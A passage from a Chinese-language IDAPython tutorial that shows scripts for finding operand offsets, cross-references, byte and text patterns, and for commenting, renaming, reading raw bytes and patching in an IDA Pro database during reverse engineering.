class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">displace = defaultdict(list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_LIB <span class="keyword">or</span> flags &amp; FUNC_THUNK:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dism_addr = idautils.FuncItems(func)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> dism_addr:</span><br><span class="line">        op = <span class="literal">None</span></span><br><span class="line">        index = <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 定义结果结构来解析当前的指令</span></span><br><span class="line">        tmp = idaapi.insn_t()</span><br><span class="line">        idaapi.decode_insn(tmp,line)</span><br><span class="line">        <span class="keyword">if</span> tmp.Op1.type == idaapi.o_displ:</span><br><span class="line">            op = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> tmp.Op2.type == idaapi.o_displ:</span><br><span class="line">            op = <span class="number">2</span> </span><br><span class="line">        <span class="keyword">if</span> op == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"bp"</span> <span class="keyword">in</span>  idc.print_operand(line,<span class="number">0</span>) <span class="keyword">or</span> <span class="string">"bp"</span> <span class="keyword">in</span> idc.print_operand(line,<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">                index = (~(int(tmp.Op1.addr) - <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                index = (~(int(tmp.Op2.addr) - <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> op ==<span class="number">1</span> :</span><br><span class="line">                index = int(tmp.Op1.addr)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                index = int(tmp.Op2.addr)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> index:</span><br><span class="line">            displace[index].append( hex(line) )</span><br><span class="line">            </span><br><span class="line">print(displace)</span><br></pre></td></tr></table></figure><p><code>idaapi.decode_insn(tmp,line)</code>是解析指令的另一种底层的方法，但是 表示偏移的意思。详细可以看<a href="https://www.hex-rays.com/products/ida/support/sdkdoc/classop__t.html#a866a7d0be0dce15c155d93d097ef54b3" target="_blank" rel="noopener">这个文档</a>。</p><p>我们已经获取了操作符的字符串表示，那么我们检查操作符中是否包含了“bp”字符串，这是一个快速判断操作符的中寄存器是否为 bp，ebp 或者 rbp 的方法。检查”bp”字符串的目的在于确定偏移量是否是一个负数。我们使用idaapi.cmd.Op1.addr 来获取偏移量，这个方法会返回一个字符串。然后我们把他转换成为一个 integer 类型，如果需要的话把它转换为正数，然后我们把它放进脚本最开始定义的字典 display 中去。这样就完成了我们的操作，之后如果你想要查找使用某个偏移量的所有地址，直接读取就可以了。</p><h5 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h5><p>有时候我们在逆向分析一个可执行文件的内存转储的时候，有些操作数就不是一个偏移量了。看如下代码：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0Ch</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">0BC10B8h</span></span><br><span class="line"><span class="keyword">push</span> [<span class="built_in">esp</span>+<span class="number">10h</span>+arg_0]</span><br><span class="line"><span class="keyword">call</span> <span class="built_in">ds</span>:_strnicmp</span><br></pre></td></tr></table></figure><p>第二个被 push 的值是一个存在内存中的偏移。如果我们通过右键把这个偏移定义为data 类型，我们可以看到这个偏移其实是一个字符串，当然完成这个定义操作很简单，但是,有时候这种操作太多了话就需要写一个脚本来自动完成这件事情。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">min = idc.get_inf_attr(INF_MIN_EA)</span><br><span class="line">max = idc.get_inf_attr(INF_MAX_EA)</span><br><span class="line"><span class="comment"># for each known function</span></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line"><span class="comment"># skip library &amp; thunk functions</span></span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_LIB <span class="keyword">or</span> flags &amp; FUNC_THUNK:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dism_addr = list(idautils.FuncItems(func))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> curr_addr <span class="keyword">in</span> dism_addr:</span><br><span class="line">        <span class="keyword">if</span> idc.get_operand_type(curr_addr, <span class="number">0</span>) == <span class="number">5</span> <span class="keyword">and</span> \</span><br><span class="line">        (min &lt; idc.get_operand_value(curr_addr,<span class="number">0</span>) &lt; max):</span><br><span class="line">            idc.op_plain_offset(curr_addr, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="comment"># print(hex(curr_addr))</span></span><br><span class="line">        <span class="keyword">if</span> idc.get_operand_type(curr_addr, <span class="number">1</span>) == <span class="number">5</span> <span class="keyword">and</span> (min &lt; idc.get_operand_value(curr_addr,<span class="number">1</span>) &lt; max):</span><br><span class="line">            idc.op_plain_offset(curr_addr, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="comment"># print( hex(curr_addr) )</span></span><br></pre></td></tr></table></figure><p><code>idc.get_operand_value(ea,n)</code>获取操作数的值。</p><p><code>idc.op_plain_offset(ea,n,base)</code>,将操作数转换为一个偏移地址，该函数的第一个参数为地址，第二个参数为操作数的索引，第三个参数是基地址，该例子中只需要设置为0即可。</p><h4 id="交叉引用-Xrefs"><a href="#交叉引用-Xrefs" class="headerlink" title="交叉引用(Xrefs)"></a>交叉引用(Xrefs)</h4><p>能够定位data段和code段的交叉引用非常重要，交叉引用的重要性在于它能够提供某个确定的数据或者某个函数被调用的位置。举个栗子，如果我们想要知道哪些地址调用了 WriteFile()函数，我们所要做的就是在导入表中找到 WriteFile()函数，然后查看其交叉引用即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">addr = idc.get_name_ea_simple(<span class="string">"StartServiceCtrlDispatcherW"</span>)</span><br><span class="line"></span><br><span class="line">print( idc.GetDisasm(addr) )</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> idautils.CodeRefsTo(addr,<span class="number">0</span>):</span><br><span class="line">    print( hex(i),idc.GetDisasm(i) )</span><br></pre></td></tr></table></figure><p><code>idc.get_name_ea_simple(&quot;StartServiceCtrlDispatcherW&quot;)</code>来获取API函数的地址，然后使用<code>idautils.CodeRefsTo(ea,flow)</code>来获取该API的所有交叉引用，在函数中，ea 参数是我们想要寻找交叉引用的地址，flow 参数是一个 bool 值，它用于指定是否遵循正常的代码流。</p><p>也可以调用 <code>idautils.Names()</code>函数来获取在 IDA 中任何 API 和被重命名的函数的相关信息，该函数将返回一个类型为(ea, str_name)的元组。</p><p>我们同样可以利用 idautisl.CodeRefsFrom(ea,flow)该函数来获取任意地址所引用的代码，下面的例子展示获取某地址的引用信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;addr = here()</span><br><span class="line">Python&gt;idautils.CodeRefsFrom(addr,<span class="number">0</span>)</span><br><span class="line">Python&gt;<span class="keyword">for</span> i <span class="keyword">in</span> idautils.CodeRefsFrom(addr,<span class="number">0</span>):print(hex(i),idc.GetDisasm(i))</span><br><span class="line"><span class="number">0x40a008</span> extrn StartServiceCtrlDispatcherW:dword</span><br></pre></td></tr></table></figure><p>但有一点要注意：使用 idautils.CodeRefsTo（ea，flow）的限制是，动态导入并手动重命名的 API 不会<br>显示为代码交叉引用。比如下面我们利用 idc.MakeName(ea, name)将一个 dword 的地址重<br>命名为”RtlCompareMemory”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;hex(ea)</span><br><span class="line"><span class="number">0xa26c78</span></span><br><span class="line">&gt;set_name(ea, <span class="string">"RtlCompareMemory"</span>, SN_CHECK)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;<span class="keyword">for</span> addr <span class="keyword">in</span> idautils.CodeRefsTo(ea,<span class="number">0</span>):print(hex(addr),idc.GetDisasm(addr))</span><br></pre></td></tr></table></figure><p>IDA 并不会将这些 API 标记为交叉引用代码。稍后我们将会使用一个通用的技术来获得所有的交叉引用。</p><p>如果我们想要查找数据的交叉引用或者调用，我们使用 idautils.DataRefsTo(e) 或者 idautils.DataRefsFrom(ea)。</p><p>idautils.DataRefsTo(ea)函数只有一个地址参数，它返回该数据地址的所有交叉引用（迭代器）。</p><p>idautils.DataRefsFrom(ea)只携带一个地址作为参数，它返回改、该地址所引用的数据地址。</p><p>在查找数据和代码的交叉引用的时候可能会有一些困惑，这里我们使用前面所提到的有一种更加通用的方法来获取交叉引用，该方法调用两个函数就能完成获取所有交叉引用地址和调用地址的效果，这两个函数就是 idautils.XrefsTo(ea, flags=0)和 idautils.XrefsFrom(ea,flags=0)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">addr = here()</span><br><span class="line"></span><br><span class="line">print(hex(addr),idc.GetDisasm(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> xref <span class="keyword">in</span> idautils.XrefsTo(addr,<span class="number">1</span>): </span><br><span class="line">    print(xref.type,idautils.XrefTypeName(xref.type),hex(xref.frm),hex(xref.to),xref.iscode)</span><br></pre></td></tr></table></figure><p><code>idautils.XrefsTo(ea,flags=0)</code>ida_xref.XREF_ALL=0 (default), ida_xref.XREF_FAR=1, ida_xref.XREF_DATA=2</p><p>xref.type来指明该交叉引用的类型，idautils.XrefTypeName(xref.t ype)用来打印表示该类型的含义，这其中有十二种不同的类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>= <span class="string">'Unknown'</span></span><br><span class="line"><span class="number">1</span>= <span class="string">'Offset'</span></span><br><span class="line"><span class="number">2</span>= <span class="string">'Write'</span></span><br><span class="line"><span class="number">3</span>= <span class="string">'Read'</span></span><br><span class="line"><span class="number">4</span>= <span class="string">'Text'</span></span><br><span class="line"><span class="number">5</span> = <span class="string">'Data_Informational'</span></span><br><span class="line"><span class="number">16</span>= <span class="string">'Far_Call'</span></span><br><span class="line"><span class="number">17</span>= <span class="string">'Near_Call'</span></span><br><span class="line"><span class="number">18</span>= <span class="string">'Far_Jump'</span></span><br><span class="line"><span class="number">19</span>= <span class="string">'Near_Jump'</span></span><br><span class="line"><span class="number">20</span>= <span class="string">'Code_User'</span></span><br><span class="line"><span class="number">21</span> = <span class="string">'Ordinary_Flow'</span></span><br></pre></td></tr></table></figure><p>xref.frm 打印出该地址的交叉引用，xref.to 打印出改地址本身，xref.iscode 打印出该交叉引用是否在代码段中，上述的代码我们使用了 idautils.XrefsTo(ea, 1)并将其 flag 位设为了1，如果我们将 flag 设为 0 的话，那么它将会显示该地址的任意交叉引用。设置flag为0获取的交叉引用不只是来自于分支跳转指令，同时还会来自正常的指令流程，设置flag为1可以略过正常指令流程造成的交叉引用。</p><h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><p>我们其实已经能够通过遍历所有已知的函数及其指令来达到一种基本的搜索效果，这当然很有用，但是有时候我们需要搜索一些特定的字节，比如说 0x55,0x8b,0xec 这种字节序列，这 3 个字节其实代表的汇编代码为 push ebp, mov ebp, esp。所以我们可以使用<code>idc.find_binary(ea,flag,searchstr,radix=16)</code>来实行字节或者二进制的搜索。ea代表啥就不说了，flag代表搜索方向或者条件。flag有好几种不同的类型：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">SEARCH_UP</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">SEARCH_DOWN</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">SEARCH_NEXT</span> = <span class="number">2</span></span><br><span class="line"><span class="attr">SEARCH_CASE</span> = <span class="number">4</span></span><br><span class="line"><span class="attr">SEARCH_REGEX</span> = <span class="number">8</span></span><br><span class="line"><span class="attr">SEARCH_NOBRK</span> = <span class="number">16</span></span><br><span class="line"><span class="attr">SEARCH_NOSHOW</span> = <span class="number">32</span></span><br><span class="line"><span class="attr">SEARCH_IDENT</span> = <span class="number">128</span></span><br><span class="line"><span class="attr">SEARCH_BRK</span> = <span class="number">256</span></span><br></pre></td></tr></table></figure><p>上面的类型不必要都看一遍，但是还是要看看一些常用的类型：</p><ul><li>SEARCH_UP 和 SEARCH_DOWN 用来指明搜索的方向</li><li>SEARCH_NEXT 用来获取下一个已经找到的对象</li><li>SEARCH_CASE 用来指明是否区分大小写</li><li>SEARCH_NOSHOW 用来指明是否显示搜索的进度</li></ul><p>searchstr 是我们要查找的形态，radix 参数在写处理器模块时使用，这超出本书要讲解的范围，所以我推荐你去看一看 Chris Eagle 的“The IDA Pro Book”的第 19 章，所以这里我们把 radix 参数留空。现在让我们来实现刚才提到的那三个字节的搜索好了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">"55 8B EC"</span></span><br><span class="line"></span><br><span class="line">addr = idc.get_inf_attr(INF_MIN_EA)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    addr = idc.find_binary(addr,SEARCH_DOWN,pattern)</span><br><span class="line">    <span class="keyword">if</span> addr!= idc.BADADDR:</span><br><span class="line">        print(hex(addr),idc.GetDisasm(addr))</span><br></pre></td></tr></table></figure><p>第一行我们定义了要搜索的形式，搜索形式可以是 16 进制格式，比如 0x55 0x8B 0xEC和 55 8B EC 都是可以的，\x55\x8B\xEC 这种格式可不行，除非你使用 idc.find_text(ea, flag,y, x, searchstr)这个函数。</p><p>但是我们搜索的时候，地址并没有增长，那是因为我们写程序的时候没有增加SEARCH_NEXT这个标记。正确的写法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">"55 8B EC"</span></span><br><span class="line"></span><br><span class="line">addr = idc.get_inf_attr(INF_MIN_EA)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    addr = idc.find_binary(addr,SEARCH_DOWN|SEARCH_NEXT,pattern)</span><br><span class="line">    <span class="keyword">if</span> addr!= idc.BADADDR:</span><br><span class="line">        print(hex(addr),idc.GetDisasm(addr))</span><br></pre></td></tr></table></figure><p>搜索字符串使用函数<code>idc.find_text(ea, flag, y, x, searchstr, from_bc695=False)</code>ea参数是地址，flag参数是搜索方向和搜索类型。y是从ea开始搜索的行数，x 是行中的坐标。这两个参数通常置 0，现在我们开始查找字符串“Accept”的出现的次数。当然你可以换换其他的字符串，可以从字符串窗口（shift+F12）获得。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">addr = idc.get_inf_attr(INF_MIN_EA)</span><br><span class="line">end = idc.get_inf_attr(INF_MAX_EA)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    addr = idc.find_text(addr,SEARCH_DOWN,<span class="number">0</span>,<span class="number">0</span>,<span class="string">"accept"</span>)</span><br><span class="line">    <span class="keyword">if</span> addr == idc.BADADDR:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(hex(addr),idc.GetDisasm(addr))</span><br><span class="line">        addr = idc.next_head(addr)</span><br></pre></td></tr></table></figure><p>因为我们利用了 idc.NextHead(ea)使当前地址不断增长，所以就不需要在 idc. FindText()中添加 SEARCH_NEXT 的标志。为什么我们要手动的增加地址呢，因为一行字符串中可能出现多次要查找的字符串，往上翻认真阅读 SEARCH_NEXT的标志的意思。</p><p>IDApython用如下函数来判断一个地址的类型，这些api返回bool值，true或者false </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">idc.is_code(f) <span class="comment"># 判断是否是代码</span></span><br><span class="line">idc.is_data(f) <span class="comment"># 判断是否是数据</span></span><br><span class="line">idc.is_tail(f) <span class="comment"># 判断 IDA 是否将其判定为尾部。</span></span><br><span class="line">idc.is_unknown(f) <span class="comment"># 判断 IDA 是否将其判定为未知，即既不是数据，也不是代码。</span></span><br><span class="line">idc.is_head(f) <span class="comment"># 判断 IDA 是否将其判定为头部。</span></span><br></pre></td></tr></table></figure><p>f 这个参数是新出现的，相比起于传递地址，我们还要先通过 idc.get_full_flags(ea)获取地址的内部标志表示，然后再传给 idc.is 系列函数当参数，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;idc.get_full_flags(here())</span><br><span class="line"><span class="number">0x4001078d</span></span><br><span class="line">Python&gt;idc.is_code( idc.get_full_flags(here()))</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p><code>idc.find_code(ea,flag)</code>该函数用来寻找被标志为代码的下一个地址。这对我们想要查找数据块的末尾是很有帮助的。如果 ea 是代码地址，那么该函数返回下一个代码地址，flag 参数看前面的 idc.find_text就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;addr = idc.find_code(addr,SEARCH_DOWN|SEARCH_NEXT)</span><br><span class="line">Python&gt;print(hex(addr),idc.GetDisasm(addr))</span><br><span class="line"><span class="number">0x404d70</span> lea     ecx, [esp+<span class="number">668</span>h+phkResult]</span><br></pre></td></tr></table></figure><p>这个函数会跳过一些数据段的地址，得到最近的一个代码端的首地址。</p><p><code>idc.find_data(ea,flag)</code>和上面的<code>find_code</code>函数差不多，不过它返回的是数据段的地址。</p><p><code>idc.find_unknown(ea,flag)</code>该功能用于查找 IDA 未识别为代码或数据的字节地址。未知类型需要通过观察或脚本进一步手动分析。</p><p><code>idc.find_defined(ea, flag)</code>它用于查找 IDA 标识为代码或数据的地址。</p><p><code>idc.find_imm(ea, flag, value)</code>用来寻找立即数。例如：相比于寻找一些类型，我们有些时候其实更希望能够找到特定的值，举个栗子，你感觉代码里面肯定是用了 rand()函数来产生随机数的，但是你就是找不到它，咋办？如果我们知道这个 rand()函数采用了 0x343fd 作为种子那么我们就可以去寻找这个数值：</p><p>idc.imm函数返回一个元组，元组的第一项为地址，第二项为标识是第几个操作数。这里操作数的算法和 idc.print_operand一样，也是从 0 开始的。循环使用搜索需要添加SEARCH_ DOWN|SEARCH_NEXT 标志。</p><h4 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h4><p>ida可以获取到用户使用鼠标选中高亮的部分的代码，可以使用如下两个函数获取到选中部分的起始地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;idc.read_selection_start()</span><br><span class="line"><span class="number">0x404cdb</span></span><br><span class="line">Python&gt;idc.read_selection_end()</span><br><span class="line"><span class="number">0x404d70</span></span><br></pre></td></tr></table></figure><p>注意<code>idc.read_selection_end()</code>获取的的并不是这一段代码的末尾地址，选中部分的最后一条指令的下一条指令的起始地址。</p><p>函数<code>idaapi.read_selection()</code>也可以实现上面的效果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p0 = idaapi.twinpos_t()</span><br><span class="line">p1 = idaapi.twinpos_t()</span><br><span class="line">view = idaapi.get_current_viewer()</span><br><span class="line">idaapi.read_selection(view, p0, p1)</span><br></pre></td></tr></table></figure><h4 id="注释和重命名"><a href="#注释和重命名" class="headerlink" title="注释和重命名"></a>注释和重命名</h4><p>注释一共有两种，第一种是常规注释，第二种是重复性注释。重复性注释会因为某些地址引用了当前地址的内容，而会自动添加上注释。</p><p>使用注释<code>idc.set_cmt(ea, cmt, 0)</code>来增加注释，使用<code>idc.set_cmt(ea, cmt, 1)</code>来增加重复性地址。</p><p>ea是要添加注释的地址，cmt是要添加的注释。</p><p><code>idc.get_cmt(ea, 0)</code>获取常规注释，<code>idc.get_cmt(ea, 1)</code>获取重复性注释。</p><p>当然不止指令可以添加注释，函数也可以添加注释，利用<code>idc.set_func_cmt(ea, cmt, repeatable)</code>来添加注释，利用<code>idc.get_func_cmt(ea, repeatable)</code>来获取函数的注释。ea可以是函数中的任何地址，cmt就是我们需要添加的注释，repeatable 同上面一样。将函数的注释标记为可重复性的话，那么它会在任何调用该函数的地方增加注释。</p><p>重命名函数和地址是一项非常常见的自动化任务，特别是在一些地址无关的代码(PIC),加壳或者封装函数中，因为在 PIC 代码和脱壳代码中，导入表可能并不存在于转储中。而封装函数的功能只是简单的调用 API 而已。</p><p><code>idc.set_name(ea, name, SN_CHECK)</code>用来重命名某个地址的函数。</p><p>值得注意的是 rename_wrapper 中的 idc.MakeNameEx(ea,name, flag)用法，因为使用 idc.MakeName 的话，如果某一个函数名称已经被使用了，那么ida 会抛出一个警告的对话。为了跳过该对话框，我们将 flag 的值设置为 256 或者SN_NOWARN 即可。我们可以应用一些逻辑来将函数重命名为 w_HeapFree_1 等，但为简洁起见，我们会将其忽略。</p><h4 id="访问原始数据"><a href="#访问原始数据" class="headerlink" title="访问原始数据"></a>访问原始数据</h4><p>在逆向工程中获取原始数据是非常重要的，原始数据是16进制的字节，它们被解释为数据或代码，ida中我们可以在反汇编代码窗口的左侧看到这些原始数据。（IDA中显示的设置方法： 菜单栏–&gt;选项–&gt;常规–&gt;反汇编–&gt;机器码字节数，填入一个数就ok了–&gt;确定 ）</p><p>要获取原始数据的话我们首先要指定获取的单元大小，这些获取原始数据 API 的命名规则就是以单元大小。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">idc.get_wide_byte(ea) // 获取单字节</span><br><span class="line">idc.get_wide_word(ea) // 获取一个字</span><br><span class="line">idc.get_wide_dword(ea) // 获取双字</span><br><span class="line">idc.get_qword(ea) // 获取四字</span><br><span class="line">idc.GetFloat(ea) </span><br><span class="line">idc.GetDouble(ea)</span><br></pre></td></tr></table></figure><p>在编写解码脚本是获取单个字节或者单个字并没有太多卵用，所以我们可以使用<br>idc.get_bytes(ea, size, use_dbg = False)来获取某个地址开始的更多的字节。最后一个参<br>数是可选的，用来指定是否正在调试内存。</p><p><code>idc.get_bytes</code>返回的是bytes类型，跟<code>idc.get_wide_byte(ea)</code>返回的整型有区别。</p><h4 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h4><p>有时候我们在逆向一个恶意软件的时候，样本会有被加密的字符串。这会阻碍我们分析的过程和组织我们通过字符串来定位关键点。这种情况下给 idb 文件打补丁就很有用了。重命名地址但是好像并没有卵用，因为命名是有约束限制的，所以我们需要给某些地址做patch了，我们可以使用如下的函数来 patch：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patch_byte(ea, value)</span><br><span class="line">patch_word(ea, value)</span><br><span class="line">patch_dword(ea, value)</span><br><span class="line">patch_qword(ea, value)</span><br></pre></td></tr></table></figure><p>ea 是地址，value 是值，注意值要和你选择的函数相对应即可。</p><h4 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h4><p>在 IDAPython 